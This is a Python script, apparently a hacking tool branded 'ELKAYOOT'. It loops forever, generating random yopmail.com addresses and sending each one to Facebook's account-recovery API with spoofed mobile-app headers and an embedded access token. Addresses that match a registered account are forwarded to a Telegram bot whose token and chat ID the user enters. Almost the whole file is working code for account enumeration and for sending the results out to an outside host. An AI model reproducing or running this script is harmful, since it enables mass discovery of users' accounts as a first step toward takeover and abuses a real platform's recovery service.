import random
import requests
import os
import sys
import random

P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
X = '\033[1;33m' #اصفر
F = '\033[2;32m'
Z = '\033[1;31m' 
L = "\033[1;95m"  #ارجواني
C = '\033[2;35m' #وردي
A = '\033[2;39m' #ازرق
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m' #وردي
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'
F = '\033[2;32m'       # أخضر فاتح → True
gg = '\x1b[38;5;208m'  # برتقالي → علامة ×
X = '\033[1;33m'       # أصفر → False
Z = '\033[1;31m'       
A = '\033[2;39m'

def elia5():
    sd = random.choice([J1, J2, J21, J22, F1, C1, P1, P2])
    os.system('clear||cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [ ELKAYOOT ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + f"""
/////////////////////////////
///////////
///////////////////////////
/////////
/////////////////////////
    """)
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [ELKAYOOT] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
elia5()
tok = input(' TOKEN : ')
iid = input(' ID : ')
os.system('clear')
ee = 0
pp = 0
def log(email):
    global ee,pp,tok,iid
    try:
        headers = {
            'Host': 'b-graph.facebook.com',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
            'Accept-Encoding': 'gzip',
            'X-Fb-Friendly-Name': 'accountRecoverySearch',
            'Authorization': 'OAuth null',
            'User-Agent': '[FBAN/FB4A;FBAV/417.0.0.33.65;FBBV/480086274;...]',
            'X-Fb-Sim-Hni': '41805',
            'X-Fb-Device-Group': '3338',
            'X-Fb-Connection-Quality': 'EXCELLENT',
            'X-Fb-Net-Hni': '41805',
            'X-Tigon-Is-Retry': 'False',
            'X-Fb-Connection-Type': 'WIFI',
            'Priority': 'u=3,i',
            'X-Fb-Http-Engine': 'Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
        }

        data = f"q={email}&friend_name=&qs=&summary=true&device_id=d15ef240-9126-44ab-9574-049eb0802d8c&src=fb4a_account_recovery&machine_id=&sfdid=a6ca2f76-0995-4db7-9083-667fc42d836d&fdid=d15ef240-9126-44ab-9574-049eb0802d8c&sim_serials=%5B%5D&sms_retriever=false&cds_experiment_group=-1&oe_aa_experiment_group=-1&oe_aa_experiment_group_immediate_exposure=-1&shared_phone_test_group=&allowlist_email_exp_name=&shared_phone_exp_name=&shared_phone_cp_nonce_code=&shared_phone_number=&is_auto_search=false&is_feo2_api_level_enabled=false&is_sso_like_oauth_search=false&encrypted_msisdn=&locale=en_US&client_country_code=IQ&method=GET&fb_api_req_friendly_name=accountRecoverySearch&fb_api_caller_class=AccountSearchHelper&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
        response = requests.post('https://b-graph.facebook.com/recover_accounts', headers=headers, data=data)
        if "network_info" in response.text:        
            os.system('clear')
            elia5()
            ee +=1
            print(f"""
{F} Good Facebook : [{ee}]
{Z} BAD Facebook : [{pp}]""")
            ff = f"""
Facebook 
━─────━[ Facebook  ]━─────━
email = {email}                        
━─────━[ Facebook  ]━─────━
﴾ py -@T_T_T_1234_T • ﴿                                      
            """
            requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text={ff}')
        else:            
            os.system('clear')
            elia5()
            pp +=1
            print(f"""
{F} Good Facebook : [{ee}]
{Z} BAD Facebook : [{pp}]""")
    except Exception as e:
        print(e)

def elia10():
    while True:
      letters = 'abcdefghijklmnopqrstuvwxyz1234567890'
      elia = ''.join(random.choice(letters) for _ in range(4))
      email = f'{elia}@yopmail.com'
      log(email)

elia10()